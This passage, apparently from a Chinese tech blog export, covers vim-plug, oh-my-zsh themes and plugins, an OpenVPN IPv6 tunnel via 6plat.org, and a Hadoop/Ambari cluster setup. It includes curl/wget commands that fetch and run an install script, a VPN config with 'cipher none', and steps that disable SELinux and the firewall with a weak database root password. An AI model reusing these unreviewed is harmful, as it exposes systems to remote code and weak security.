<h3 id="plug插件管理器相关命令"><a href="#plug插件管理器相关命令" class="headerlink" title="plug插件管理器相关命令"></a>plug插件管理器相关命令</h3><p><strong>安装插件</strong></p>
<p>在<code>vimrc</code>中添加需要的插件<code>plug</code>内容，重载<code>vimrc</code>，使用命令进行安装</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugInstall</span><br></pre></td></tr></table></figure>
<p><strong>检查状态</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugStatus</span><br></pre></td></tr></table></figure>
<p><strong>更新插件</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugUpdate</span><br></pre></td></tr></table></figure>
<p><strong>更新plug插件管理器</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugUpgrade</span><br></pre></td></tr></table></figure>
<p><strong>删除插件</strong></p>
<p>将<code>vimrc</code>中的<code>plug</code>内容删除，重载<code>vimrc</code>，使用命令进行删除</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">PlugClean</span><br></pre></td></tr></table></figure>
<p><strong>审查插件</strong></p>
<p>更新的插件可能会有新bug，需要滚回插件版本，使用该命令可查看上次<code>PlugUpdate</code>的更，在段落上按<code>X</code>将插件滚回到更新前的状态</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugDiff</span><br></pre></td></tr></table></figure>
<h3 id="插件的使用"><a href="#插件的使用" class="headerlink" title="插件的使用"></a>插件的使用</h3><p><strong>NERD Tree 目录树</strong></p>
<p>通过设置的映射按键（<code>F3</code>）启用或禁用<code>NERD Tree</code></p>
<p><code>NERD Tree</code>提供一些常用快捷键来操作目录:</p>
<ul>
<li>通过 <code>h、j、k、l</code> 来移动光标</li>
<li><code>o</code> 打开关闭文件或目录，如果想打开文件，必须光标移动到文件名</li>
<li><code>t</code> 在标签页中打开</li>
<li><code>s</code> 和 <code>i</code> 可以水平或纵向分割窗口打开文件</li>
<li><code>p</code> 到上层目录</li>
<li><code>P</code> 到根目录</li>
<li><code>K</code> 到同目录第一个节点</li>
<li><code>P</code> 到同目录最后一个节点</li>
</ul>
<h5 id="YouCompleteMe-amp-syntastic"><a href="#YouCompleteMe-amp-syntastic" class="headerlink" title="YouCompleteMe &amp; syntastic"></a>YouCompleteMe &amp; syntastic</h5><p>在输入时敲入相关代码，就会自动提示代码列表，选择后按<code>`tab</code>键即可补全</p>
<p><code>YouCompleteMe</code>已经集成了<a href="https://github.com/scrooloose/syntastic">Syntastic</a>，所以出现代码语法错误，就会有红色错误提示</p>
<p><strong>ctrlp</strong></p>
<p>启用ctrlp</p>
<ul>
<li>运行命令<code>:CtrlP</code>或<code>:CtrlP [starting-directory]</code>来以查找文件模式来启用<strong>ctrlp</strong></li>
<li>运行命令<code>:CtrlPBuffer</code>或<code>:CtrlPMRU</code>来以查找缓冲或最近打开文件模式来启用<strong>ctrlp</strong></li>
<li>运行命令<code>CtrlPMixed</code>来查找文件、查找缓冲和最近打开文件混合模式来启动<strong>ctrlp</strong></li>
</ul>
<p>基本使用</p>
<ul>
<li>按<code>&lt;c-f&gt;</code>和<code>&lt;c-b&gt;</code>在三种查找模式中互相切换</li>
<li>按<code>&lt;c-y&gt;</code>来创建新文件和对应的父目录</li>
<li>按<code>&lt;c-d&gt;</code>来切换到只查找文件名而不是全路径</li>
<li>按<code>&lt;c-j&gt;</code>，<code>&lt;c-k&gt;</code>或箭头方向键来移动查找结果列表</li>
<li>按<code>&lt;c-t&gt;</code>或<code>&lt;c-v&gt;</code>，<code>&lt;c-x&gt;</code>来以新标签或分割窗口的方式来打开文件</li>
<li>按<code>&lt;c-z&gt;</code>来标识或取消标识文件，然后按<code>&lt;c-o&gt;</code>来打开文件</li>
<li>按<code>&lt;c-n&gt;</code>，<code>&lt;c-p&gt;</code>来在提示历史中选择下一个/上一个字符串</li>
</ul>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>zsh定制</title>
    <url>/2019/10/24/zsh%E5%AE%9A%E5%88%B6/</url>
    <content><![CDATA[<p>先安装<a href="https://github.com/zsh-users/zsh"><code>zsh</code></a></p>
<h1 id="安装oh-my-zsh（需要代理）"><a href="#安装oh-my-zsh（需要代理）" class="headerlink" title="安装oh-my-zsh（需要代理）"></a>安装<a href="https://github.com/robbyrussell/oh-my-zsh">oh-my-zsh</a>（需要代理）</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># curl方式</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wget方式</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(wget -O- https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="自带功能"><a href="#自带功能" class="headerlink" title="自带功能"></a>自带功能</h1><h2 id="自带插件"><a href="#自带插件" class="headerlink" title="自带插件"></a><a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugins">自带插件</a></h2><p>  <strong>启用自带插件只需修改<code>~/.zshrc</code>文件，在<code>plugins=()</code>中加入插件名即可启用</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugins&#x3D;(git extract z sudo</span><br><span class="line">		per-directory-history</span><br><span class="line">		sublime</span><br><span class="line">		vscode</span><br><span class="line">		)</span><br></pre></td></tr></table></figure></p>
<p>  插件文件放在<code>~/.oh-my-zsh/plugins</code></p>
<p>  <strong>git</strong>: 定义了git的别名</p>
<p>  <strong>extract</strong>: 解压；tar、gz、zip、rar全部使用extract命令解压</p>
<p>  <strong>z</strong>: 快速跳转目录；<code>cd ~/user/github/git</code> 进入文件夹，下一次想进入 git 文件夹的时候,直接 <code>z git</code> 即可；<code>z -x 不要的路径</code>可删除不需要的</p>
<p>  <strong>sudo</strong>: 按两下ESC，自动在头部加上<code>sudo</code></p>
<p>  <strong>per-directory-history</strong>:目录下的命令历史</p>
<p>  <strong>sublime</strong>: Sublime Text 助手；<code>st</code>(打开Sublime Text)、<code>st 文件or项目文件夹</code>、<code>stt</code>(打开当前项目目录)、<code>sst 文件or项目文件夹</code>(相当sudo st)</p>
<p>  <strong>vscode</strong>: Visual Studio Code助手</p>
<h2 id="oh-my-zsh自带主题"><a href="#oh-my-zsh自带主题" class="headerlink" title="oh-my-zsh自带主题"></a><a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Themes">oh-my-zsh自带主题</a></h2><p>  注意：有些主题需要安装<a href="https://github.com/powerline/fonts">Powerline fonts</a>才能正确呈现</p>
<p>  主题推荐:ys agnoster avit</p>
<p>  <strong>修改主题</strong>: 编辑 <code>~/.zshrc</code> 的 <code>ZSH_THEME</code> 即可</p>
<h1 id="非自带"><a href="#非自带" class="headerlink" title="非自带"></a>非自带</h1><h2 id="非自带插件"><a href="#非自带插件" class="headerlink" title="非自带插件"></a>非自带插件</h2><p><strong>非自带插件需要克隆项目到<code>~/.oh-my-zsh/plugins/</code>下</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/oh-my-zsh/plugins</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/***/xxx.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/***/xxx.git ~/.oh-my-zsh/plugins/xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>若提示权限不足则加 sudo 即可，这是因为clone的oh-my-zsh仓库权限问题</p>
<p>  修改<code>~/.zshrc</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugins&#x3D;(</span><br><span class="line">		其他的插件</span><br><span class="line">		zsh-autosuggestions</span><br><span class="line">		zsh-syntax-highlighting</span><br><span class="line">		git-open</span><br><span class="line">		)</span><br></pre></td></tr></table></figure></p>
<p>  <a href="https://github.com/zsh-users/zsh-autosuggestions"><strong>zsh-autosuggestions</strong></a>: 自动建议</p>
<p>  <a href="https://github.com/zsh-users/zsh-syntax-highlighting"><strong>zsh-syntax-highlighting</strong></a>: 命令高亮显示</p>
<p>  <a href="https://github.com/paulirish/git-open"><strong>git-open</strong></a>: <code>git open</code>打开当前项目的远程仓库地址</p>
<h2 id="外部主题"><a href="#外部主题" class="headerlink" title="外部主题"></a><a href="https://github.com/robbyrussell/oh-my-zsh/wiki/External-themes">外部主题</a></h2><p>  推荐: <a href="https://github.com/fdaciuk/avit-da2k">avit-da2k</a> , <a href="https://github.com/Powerlevel9k/powerlevel9k">powerlevel9k</a> , <a href="https://github.com/denysdovhan/spaceship-prompt">Spaceship ZSH</a> ,  <a href="https://github.com/tobyjamesthomas/pi">Pi</a></p>
<p>  更外部主题可直接在github上搜索<code>zsh-theme</code>获取</p>
<h1 id="oh-my-zsh-配置"><a href="#oh-my-zsh-配置" class="headerlink" title="oh-my-zsh 配置"></a>oh-my-zsh 配置</h1><p>  默认情况下，oh-my-zsh每隔几周检查一次升级，如果希望不升级，在 <code>~/.zshrc</code> 中设置以下内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 禁用提示升级</span><br><span class="line">DISABLE_UPDATE_PROMPT&#x3D;true</span><br><span class="line"></span><br><span class="line"># 禁用自动升级</span><br><span class="line">DISABLE_AUTO_UPDATE&#x3D;true</span><br></pre></td></tr></table></figure>
<p>手动升级使用 <code>upgrade_oh_my_zsh</code> 命令</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>个人固定IPv6地址申请</title>
    <url>/2019/08/29/%E4%B8%AA%E4%BA%BA%E5%9B%BA%E5%AE%9AIPv6%E5%9C%B0%E5%9D%80%E7%94%B3%E8%AF%B7/</url>
    <content><![CDATA[<h1 id="个人固定IPv6地址申请"><a href="#个人固定IPv6地址申请" class="headerlink" title="个人固定IPv6地址申请"></a>个人固定IPv6地址申请</h1><h4 id="申请"><a href="#申请" class="headerlink" title="申请"></a>申请</h4><p>该IPv6的地址由<code>6plat.org</code>提供，然后通过VPN实现IPv6，据说IPv6在墙外</p>
<p><strong>使用公共账号（动态分配地址）</strong></p>
<p>用户名和密码都是<code>6plat.org</code></p>
<p><strong>个人账号（固定地址）</strong></p>
<a id="more"></a>
<p>需要固定IPv6地址的个人用户，可发申请邮件到【 6plat@biigroup.cn 】 ，注明用户名密码，账号后台自动开通，收到自动回复邮件，账号会在2个工作日内开通。<br>申请到个人账号之后，可以使用静态IPv6地址。重点是个人账号可以享受带宽保障策略</p>
<p><strong>申请格式：</strong><br><strong><em>主题</em></strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6Plat-46个人账号申请</span><br></pre></td></tr></table></figure><br><strong><em>内容</em></strong></p>
<blockquote>
<p>用户名(空格)密码<br>例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yonghuming mima</span><br></pre></td></tr></table></figure><br>用户名不支持中文和大小写</p>
</blockquote>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><a href="http://bbs2.6plat.org/d/19">参考官方使用手册</a></p>
<p>通过<code>openvpn</code>链接VPN使用IPv6<br><strong>下载安装openvpn客户端</strong><br><a href="https://www.lanzous.com/b938806/">Mac、Win7、Win10</a>密码:eonun</p>
<p><code>Linux</code>上直接通过不同发行版的包管理器进行网络源安装，包名：<code>openvpn</code>，部分Linux内置了，只需添加配置即可使用</p>
<p><code>Android</code>在谷歌应用商店下载</p>
<p><code>ios</code>在App Store下载</p>
<p><strong>创建配置文件</strong><br>创建名为<code>6plat.ovpn</code>的配置文件，将配置文件导入到客户端，连接时输入账号密码即可<br>配置文件内容：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">client</span><br><span class="line">dev tun</span><br><span class="line">proto tcp</span><br><span class="line">remote 46.6plat.org 9185</span><br><span class="line">comp-lzo</span><br><span class="line">resolv-retry infinite</span><br><span class="line">nobind</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">setenv CLIENT_CERT 0</span><br><span class="line">auth-user-pass</span><br><span class="line">remote-cert-tls server</span><br><span class="line">verb 3</span><br><span class="line">sndbuf 0</span><br><span class="line">rcvbuf 0</span><br><span class="line">route-ipv6 ::&#x2F;0 240c:f:1:6000::1</span><br><span class="line">cipher none</span><br><span class="line">&lt;ca&gt;</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIE3zCCA8egAwIBAgIJAJVvrlqcS4YsMA0GCSqGSIb3DQEBCwUAMIGlMQswCQYD</span><br><span class="line">VQQGEwJDTjEQMA4GA1UECBMHQmVpamluZzEQMA4GA1UEBxMHQmVpamluZzESMBAG</span><br><span class="line">A1UEChMJNnBsYXQub3JnMRMwEQYDVQQLEwo2cGxhdGdyb3VwMRUwEwYDVQQDEww2</span><br><span class="line">cGxhdC5vcmcgQ0ExEDAOBgNVBCkTB0Vhc3lSU0ExIDAeBgkqhkiG9w0BCQEWETZw</span><br><span class="line">bGF0QGJpaWdyb3VwLmNuMB4XDTE3MDEwNDA5MTc1NVoXDTI3MDEwMjA5MTc1NVow</span><br><span class="line">gaUxCzAJBgNVBAYTAkNOMRAwDgYDVQQIEwdCZWlqaW5nMRAwDgYDVQQHEwdCZWlq</span><br><span class="line">aW5nMRIwEAYDVQQKEwk2cGxhdC5vcmcxEzARBgNVBAsTCjZwbGF0Z3JvdXAxFTAT</span><br><span class="line">BgNVBAMTDDZwbGF0Lm9yZyBDQTEQMA4GA1UEKRMHRWFzeVJTQTEgMB4GCSqGSIb3</span><br><span class="line">DQEJARYRNnBsYXRAYmlpZ3JvdXAuY24wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw</span><br><span class="line">ggEKAoIBAQDpTRpxYttg0EsUYWCE3GKLMPTDXlzVtn93yb9MdgUJkCiGNgaXHQ6Y</span><br><span class="line">NCcOXb3pLIxZN7eYH873ZgAY74+LiEIIAAPn+CTQjTcZ82r92xuSj47mMNd4&#x2F;CcG</span><br><span class="line">5byC9clsNijsWvJ7Rq2Fy2ynSddWMMkmVGZ8oS3psPc57cEOBUBdhTI4szo6aLE0</span><br><span class="line">N3&#x2F;AAFpIdfxlTATc5EWFxEk4SMPWAIcqkvZ1ETBit+HHU+Bv2oYcpzzi6jHmVw0d</span><br><span class="line">EofxV0w3AUNUN894mWprBtZKZ+DVqms0+LI3mLWPXsv3m8zYBNTXqgE5p4vJ+E3J</span><br><span class="line">3AzDKH2Rb&#x2F;coBiy3V2g0Cdgc9vATQ4XzAgMBAAGjggEOMIIBCjAdBgNVHQ4EFgQU</span><br><span class="line">M&#x2F;hZJqaKeV9UVH6WoS7iwAk8&#x2F;Q0wgdoGA1UdIwSB0jCBz4AUM&#x2F;hZJqaKeV9UVH6W</span><br><span class="line">oS7iwAk8&#x2F;Q2hgaukgagwgaUxCzAJBgNVBAYTAkNOMRAwDgYDVQQIEwdCZWlqaW5n</span><br><span class="line">MRAwDgYDVQQHEwdCZWlqaW5nMRIwEAYDVQQKEwk2cGxhdC5vcmcxEzARBgNVBAsT</span><br><span class="line">CjZwbGF0Z3JvdXAxFTATBgNVBAMTDDZwbGF0Lm9yZyBDQTEQMA4GA1UEKRMHRWFz</span><br><span class="line">eVJTQTEgMB4GCSqGSIb3DQEJARYRNnBsYXRAYmlpZ3JvdXAuY26CCQCVb65anEuG</span><br><span class="line">LDAMBgNVHRMEBTADAQH&#x2F;MA0GCSqGSIb3DQEBCwUAA4IBAQBzYlX&#x2F;RgvViVvcxwGQ</span><br><span class="line">SN9wP32U9aALFI4GCQz6ODrlYVx4m00zJeuR69bjLO3NZgMv6LtcovbuME+FYq&#x2F;4</span><br><span class="line">uXJJIfMlo2S&#x2F;kKp5dBaGk9ERx0xs2OLAKyzc4wgx5zah5Nke1NhdYdCB6Lj6tM+s</span><br><span class="line">vthNz2SWpcctvlOvV+5IdVrefiaLl7RBgf2j81DYmPCILZwHo8rQ0zKppgqAFcFk</span><br><span class="line">tDO0FnHQcwe6xfTE1cIoOU39t+hTnvxQDBW4p9xkxX0hAFnNV41OadgEwxqyo6J0</span><br><span class="line">BZ4dtEw8E9FFF8ewWl897xSv6AMPZTizFl3OReE376Kgv+gtFlSuj4kizCd7uiRp</span><br><span class="line">o5ab</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">&lt;&#x2F;ca&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>Openwrt路由器使用IPv6</strong>参考以下文章<br>教你通过路由器部署IPv6环境【<a href="https://blog.csdn.net/baidu_35946698/article/details/80124956">上篇</a>】，【<a href="https://blog.csdn.net/baidu_35946698/article/details/80125282">下篇</a>】<br><a href="http://www.zhangjun.sh.cn/index.php/linux/openwrt-6plat-ipv6.html">OpenWrt利用6plat部署IPv6环境</a></p>
]]></content>
      <categories>
        <category>技能</category>
      </categories>
      <tags>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title>修改主题后oh-my-zsh升级失败解决</title>
    <url>/2020/09/24/%E4%BF%AE%E6%94%B9%E4%B8%BB%E9%A2%98%E5%90%8Eoh-my-zsh%E5%8D%87%E7%BA%A7%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Oh My Zsh] Would you like to check <span class="keyword">for</span> updates? [Y/n]: y</span><br><span class="line">Updating Oh My Zsh</span><br><span class="line">error: cannot pull with rebase: You have unstaged changes.</span><br><span class="line">error: please commit or stash them.</span><br><span class="line">There was an error updating. Try again later?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[oh-my-zsh] Would you like to update? [Y/n] y</span><br><span class="line">Updating Oh My Zsh</span><br><span class="line">error: 无法拉取，因为您有未合并的文件。</span><br><span class="line">提示：请在工作区改正文件，然后酌情使用 <span class="string">&#x27;git add/rm &lt;文件&gt;&#x27;</span> 命令标记</span><br><span class="line">提示：解决方案并提交。</span><br><span class="line">fatal: 因为存在未解决的冲突而退出。</span><br><span class="line">There was an error updating. Try again later?</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>出现这个问题的原因是我们对<code>.oh-my-zsh</code>里的内容进行了更改之后没有提交<br>通过终端进入<code>.oh-my-zsh</code>目录之后输入<code>git status</code>，看到主题文件发生了更改，且没有提交</p>
<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>把变更提交即可<br><code>git add .</code><br><code>git commit -m &#39;对更改的描述&#39;</code></p>
<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p><code>cd  “ $ ZSH ”  &amp;&amp; git stash &amp;&amp; upgrade_oh_my_zsh &amp;&amp; git stash pop</code></p>
<p>尝试<code>git stash</code>然后运行升级，然后<code>git stash pop</code>之后，找回更改</p>
]]></content>
      <categories>
        <category>Zsh</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Zsh</tag>
      </tags>
  </entry>
  <entry>
    <title>先电云计算BigData</title>
    <url>/2019/12/24/%E5%85%88%E7%94%B5%E4%BA%91%E8%AE%A1%E7%AE%97BigData/</url>
    <content><![CDATA[<h2 id="基础平台搭建"><a href="#基础平台搭建" class="headerlink" title="基础平台搭建"></a>基础平台搭建</h2><h3 id="master"><a href="#master" class="headerlink" title="master"></a>master</h3><p><strong><code>hostnamectl set-hostname master</code></strong>        //修改主机名</p>
<p><strong><code>hostname</code></strong></p>
<p><strong><code>logout</code></strong></p>
<p><strong><code>vi /etc/hosts</code></strong>                            //添加本地域名解析</p>
<blockquote>
<p>192.168.200.131 master.hadoop master</p>
<p>192.168.200.133 slave1.hadoop</p>
</blockquote>
<a id="more"></a>
<p><strong><code>ping slave1.hadoop</code></strong>        //检测</p>
<h3 id="slave1"><a href="#slave1" class="headerlink" title="slave1"></a>slave1</h3><p><strong><code>hostnamectl set-hostname slave1</code></strong></p>
<p><strong><code>hostname</code></strong></p>
<p><strong><code>logout</code></strong></p>
<p><strong><code>vi /etc/hosts</code></strong></p>
<blockquote>
<p>192.168.200.131 master.hadoop</p>
<p>192.168.200.133 slave1.hadoop slave1</p>
</blockquote>
<p><strong><code>ping master.hadoop</code></strong></p>
<hr>
<h3 id="master-1"><a href="#master-1" class="headerlink" title="master"></a>master</h3><p><strong><code>mv /etc/yum.repos.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/ambari.repo</code></strong>        //新建yum源配置文件</p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=ftp://192.168.100.10/centos/</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[ambari]</p>
<p>name=ambari</p>
<p>baseurl=file:///opt/ambari/ambari-2.6.0.0</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>mkdir /opt/ambari</code></strong></p>
<p><strong><code>mount XianDian-BigData-v2.2.iso /opt/ambari/</code></strong></p>
<p><strong><code>yum clean all</code></strong></p>
<p><strong><code>yum list</code></strong></p>
<p><strong><code>yum install -y vsftpd</code></strong>                //搭建ftp服务器</p>
<p><strong><code>vi /etc/vsftpd/vsftpd.conf</code></strong>        //修改ftp根目录</p>
<blockquote>
<p>anon_root=/opt</p>
</blockquote>
<p><strong><code>vi /etc/selinux/config</code></strong></p>
<blockquote>
<p><em>SELINUX=enforcing=&gt;SELINUX=disabled</em>        //disabled需要修改文件后重启生效，permissive也可</p>
</blockquote>
<p><strong><code>setenforce 0</code></strong>                     //设为Permissive,1为enforcing</p>
<p><strong><code>getenforce</code></strong>                        //获得Selinux的状态</p>
<blockquote>
<p>Permissive</p>
</blockquote>
<p><strong><code>systemctl disable firewalld</code></strong>        //关闭防火墙和Selinux，先电镜像是关闭的无需操作</p>
<p><strong><code>systemctl stop firewalld</code></strong></p>
<p><strong><code>systemctl enable vsftpd</code></strong></p>
<p><strong><code>systemctl start vsftpd</code></strong></p>
<h3 id="slave1-1"><a href="#slave1-1" class="headerlink" title="slave1"></a>slave1</h3><p><strong><code>mv /etc/yum.repos.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/ambari.repo</code></strong></p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=ftp://192.168.100.10/centos/</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[ambari]</p>
<p>name=ambari</p>
<p>baseurl=ftp://192.168.200.131/ambari/ambari-2.6.0.0</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>yum clean all</code></strong></p>
<p><strong><code>yum list</code></strong></p>
<p><strong><code>vi /etc/selinux/config</code></strong></p>
<blockquote>
<p><em>SELINUX=enforcing =&gt; SELINUX=disabled</em>        //disabled需要修改文件后重启生效，permissive也可</p>
</blockquote>
<p><strong><code>setenforce 0</code></strong>                     //设为Permissive,1为enforcing</p>
<p><strong><code>getenforce</code></strong>                        //获得Selinux的状态</p>
<blockquote>
<p><em>Permissive</em></p>
</blockquote>
<p><strong><code>systemctl disable firewalld</code></strong>        //关闭防火墙和Selinux，先电镜像是关闭的无需操作</p>
<p><strong><code>systemctl stop firewalld</code></strong></p>
<hr>
<h3 id="master-2"><a href="#master-2" class="headerlink" title="master"></a>master</h3><p><strong><code>yum -y install httpd</code></strong></p>
<p><strong><code>cp -r /opt/ambari/HDP-* /var/www/html/</code></strong></p>
<p><strong><code>systemctl enable httpd</code></strong></p>
<p><strong><code>systemctl start httpd</code></strong></p>
<p><strong><code>yum -y install ntp</code></strong></p>
<p><strong><code>vi /etc/ntp.conf</code></strong></p>
<blockquote>
<h1 id="server-0-centos-pool-ntp-org-iburst-将原有的四条注释掉"><a href="#server-0-centos-pool-ntp-org-iburst-将原有的四条注释掉" class="headerlink" title="server 0.centos.pool.ntp.org iburst        //将原有的四条注释掉"></a>server 0.centos.pool.ntp.org iburst        //将原有的四条注释掉</h1><h1 id="server-1-centos-pool-ntp-org-iburst"><a href="#server-1-centos-pool-ntp-org-iburst" class="headerlink" title="server 1.centos.pool.ntp.org iburst"></a>server 1.centos.pool.ntp.org iburst</h1><h1 id="server-2-centos-pool-ntp-org-iburst"><a href="#server-2-centos-pool-ntp-org-iburst" class="headerlink" title="server 2.centos.pool.ntp.org iburst"></a>server 2.centos.pool.ntp.org iburst</h1><h1 id="server-3-centos-pool-ntp-org-iburst"><a href="#server-3-centos-pool-ntp-org-iburst" class="headerlink" title="server 3.centos.pool.ntp.org iburst"></a>server 3.centos.pool.ntp.org iburst</h1><p>server 127.127.1.0                    //添加两行</p>
<p>fudge 127.127.1.0 startum 10</p>
</blockquote>
<p><strong><code>systemctl enable ntpd</code></strong></p>
<p><strong><code>systemctl start ntpd</code></strong></p>
<h3 id="slave1-2"><a href="#slave1-2" class="headerlink" title="slave1"></a>slave1</h3><p><strong><code>yum install -y ntpdate</code></strong></p>
<p><strong><code>ntpdate master.hadoop</code></strong></p>
<p><strong><code>systemctl enable ntpdate</code></strong></p>
<hr>
<h3 id="master-3"><a href="#master-3" class="headerlink" title="master"></a>master</h3><p><strong><code>ssh slave1.hadoop</code></strong>        //检测能否用无密码公钥认证访问（第一次需要用确认使用公钥访问），若不能则需要配置无密码公钥访问    使用<strong>exit</strong>退出连接</p>
<p><strong><code>ssh-keygen</code></strong>                //生成公钥</p>
<p><strong><code>ssh-copy-id slave1.hadoop</code></strong>        //将公钥复制到目标主机</p>
<h3 id="slave1-3"><a href="#slave1-3" class="headerlink" title="slave1"></a>slave1</h3><p><strong><code>ssh master1.hadoop#</code></strong></p>
<p><strong><code>ssh-keygen</code></strong></p>
<p><strong><code>ssh-copy-id slave1.hadoop</code></strong></p>
<hr>
<h3 id="master-amp-slave1"><a href="#master-amp-slave1" class="headerlink" title="master&amp;slave1"></a>master&amp;slave1</h3><p><strong><code>cat /sys/kernel/mm/transparent_hugepage/enabled</code></strong></p>
<blockquote>
<blockquote>
<p>[always] madvise never    //Transparent Huge Pages状态为开启的，需要关闭，该文件不可编辑，不能永久修改所有修改==<strong>重启后失效</strong>==</p>
</blockquote>
</blockquote>
<p><strong><code>echo never &gt;  /sys/kernel/mm/transparent_hugepage/enabled</code></strong></p>
<p><strong><code>echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag</code></strong></p>
<p><strong><code>cat /sys/kernel/mm/transparent_hugepage/enabled</code></strong></p>
<blockquote>
<blockquote>
<p>always madvise [never]    //关闭状态</p>
</blockquote>
</blockquote>
<hr>
<h3 id="master-4"><a href="#master-4" class="headerlink" title="master"></a>master</h3><p><strong><code>mkdir /usr/jdk64/</code></strong></p>
<p><strong><code>tar -zxvf /opt/ambari/jdk-8u77-linux-x64.tar.gz -C /usr/jdk64/</code></strong></p>
<p><strong><code>vi /etc/profile</code></strong></p>
<blockquote>
<p>export JAVA_HOME=/usr/jdk64/jdk1.8.0_77</p>
<p>export PATH=$JAVA_HOME/bin:$PATH</p>
</blockquote>
<p><strong><code>source /etc/profile</code></strong></p>
<p><strong><code>java -version</code></strong></p>
<blockquote>
<blockquote>
<p>java version “1.8.0_77”</p>
<p>Java(TM) SE Runtime Environment (build 1.8.0_77-b03)</p>
<p>Java HotSpot(TM) 64-Bit Server VM (build 25.77-b03, mixed mode)</p>
</blockquote>
</blockquote>
<p><strong><code>scp /opt/ambari/jdk-8u77-linux-x64.tar.gz 192.168.200.133:/opt</code></strong>        //通过ssh的scp将文件发到目标机</p>
<h3 id="slave1-4"><a href="#slave1-4" class="headerlink" title="slave1"></a>slave1</h3><p><strong><code>mkdir /usr/jdk64jdk1.8.0_77/</code></strong></p>
<p><strong><code>tar -zxvf /opt/jdk-8u77-linux-x64.tar.gz -C /usr/jdk64/</code></strong></p>
<p><strong><code>vi /etc/profile</code></strong></p>
<blockquote>
<p>export JAVA_HOME=/usr/jdk64/jdk1.8.0_77</p>
<p>export PATH=$JAVA_HOME/bin:$PATH</p>
</blockquote>
<p><strong><code>source /etc/profile</code></strong></p>
<p><strong><code>java -version</code></strong></p>
<blockquote>
<blockquote>
<p>java version “1.8.0_77”</p>
<p>Java(TM) SE Runtime Environment (build 1.8.0_77-b03)</p>
<p>Java HotSpot(TM) 64-Bit Server VM (build 25.77-b03, mixed mode)</p>
</blockquote>
</blockquote>
<hr>
<h2 id="配置ambari"><a href="#配置ambari" class="headerlink" title="配置ambari"></a>配置ambari</h2><h3 id="master-5"><a href="#master-5" class="headerlink" title="master"></a>master</h3><p><strong><code>yum -y install ambari-server</code></strong></p>
<p><strong><code>yum -y install mariadb mariadb-server mysql-connector-java</code></strong></p>
<p><strong><code>systemctl enable mariadb</code></strong></p>
<p><strong><code>systemctl start mariadb</code></strong></p>
<p><strong><code>mysql_secure_installation</code></strong></p>
<blockquote>
<blockquote>
<p>Enter current password for root (enter for none):        //初始时无密码自接回车</p>
<p>Set root password? [Y/n]<strong><code>y</code></strong>    //设置root密码为“<code>bigdata</code>”</p>
<p>New password:         //填入密码是不显示的</p>
<p>Re-enter new password:</p>
<p>Remove anonymous users? [Y/n]<strong><code>y</code></strong>        //删除匿名用户</p>
<p>Disallow root login remotely? [Y/n] <strong><code>n</code></strong>    //是否禁用root远程登录</p>
<p>Remove test database and access to it? [Y/n] <strong><code>y</code></strong>    //删除测试数据库</p>
<p>Reload privilege tables now? [Y/n]<strong><code>y</code></strong>        //从新加载权限表</p>
</blockquote>
</blockquote>
